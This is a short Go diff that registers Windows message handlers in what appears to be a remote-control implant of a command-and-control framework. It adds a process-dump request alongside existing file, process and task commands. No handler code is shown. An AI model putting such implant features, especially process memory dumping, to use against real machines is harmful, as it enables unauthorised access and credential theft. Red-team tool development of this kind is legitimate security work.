@@ -11,18 +11,19 @@ import (
 
 var (
 	windowsHandlers = map[string]interface{}{
-		pb.MsgTask:        taskHandler,
-		pb.MsgRemoteTask:  remoteTaskHandler,
-		pb.MsgPsListReq:   psHandler,
-		pb.MsgPing:        pingHandler,
-		pb.MsgKill:        killHandler,
-		pb.MsgDirListReq:  dirListHandler,
-		pb.MsgDownloadReq: downloadHandler,
-		pb.MsgUploadReq:   uploadHandler,
-		pb.MsgCdReq:       cdHandler,
-		pb.MsgPwdReq:      pwdHandler,
-		pb.MsgRmReq:       rmHandler,
-		pb.MsgMkdirReq:    mkdirHandler,
+		pb.MsgTask:           taskHandler,
+		pb.MsgRemoteTask:     remoteTaskHandler,
+		pb.MsgPsListReq:      psHandler,
+		pb.MsgPing:           pingHandler,
+		pb.MsgKill:           killHandler,
+		pb.MsgDirListReq:     dirListHandler,
+		pb.MsgDownloadReq:    downloadHandler,
+		pb.MsgUploadReq:      uploadHandler,
+		pb.MsgCdReq:          cdHandler,
+		pb.MsgPwdReq:         pwdHandler,
+		pb.MsgRmReq:          rmHandler,
+		pb.MsgMkdirReq:       mkdirHandler,
+		pb.MsgProcessDumpReq: dumpHandler,
 	}
 )
 
